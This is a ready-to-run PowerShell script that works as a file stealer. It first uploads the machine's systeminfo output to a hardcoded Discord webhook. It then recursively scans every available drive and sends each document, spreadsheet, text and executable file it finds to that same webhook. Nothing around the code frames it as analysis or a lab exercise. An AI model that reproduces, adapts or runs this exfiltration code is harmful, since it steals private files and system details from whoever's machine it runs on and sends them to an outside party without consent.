$DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
$FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")

function Get-AvailableDrives {
    # Check all drive letters from A:\ to Z:\
    $Drives = @()
    foreach ($Drive in 'A'..'Z') {
        $Path = "${Drive}:\""
        if (Test-Path -Path $Path) {
            $Drives += $Path
        }
    }
    return $Drives
}

function Send-FileToDiscord {
    param (
        [string]$FilePath
    )

    try {
        $FileName = Split-Path -Leaf $FilePath
        $FileContent = [System.IO.File]::ReadAllBytes($FilePath)
        $ContentType = [System.Web.MimeMapping]::GetMimeMapping($FilePath)

        # Build request body with the file
        Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -InFile $FilePath -ContentType $ContentType
        Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
    } catch {
        Write-Host "Failed to send $FilePath to Discord: $_" -ForegroundColor Red
    }
}

function Send-SystemInfo {
    try {
        $TempFilePath = Join-Path -Path $env:TEMP -ChildPath "systeminfo.txt"
        systeminfo > $TempFilePath
        Send-FileToDiscord -FilePath $TempFilePath
        Remove-Item -Path $TempFilePath -Force
        Write-Host "System info sent to Discord." -ForegroundColor Green
        return $true
    } catch {
        Write-Host "Failed to send system info to Discord: $_" -ForegroundColor Red
        return $false
    }
}

function Scan-And-Send-Files {
    param (
        [string[]]$TargetDirectories,
        [string[]]$Extensions
    )

    foreach ($TargetDirectory in $TargetDirectories) {
        Get-ChildItem -Path $TargetDirectory -Recurse -File | Where-Object {
            $Extensions -contains $_.Extension
        } | ForEach-Object {
            Send-FileToDiscord -FilePath $_.FullName
        }
    }
}

function Main {
    # Send system information first to test the connection
    $SystemInfoSent = Send-SystemInfo
    if (-not $SystemInfoSent) {
        Write-Host "Exiting script due to failed connection test." -ForegroundColor Red
        return
    }

    # If system info was sent successfully, proceed with scanning and sending files
    $AvailableDrives = Get-AvailableDrives
    Write-Host "Available drives: $AvailableDrives"

    # Send files with matching extensions to Discord
    Scan-And-Send-Files -TargetDirectories $AvailableDrives -Extensions $FileExtensions
}

# Execute the script
Main
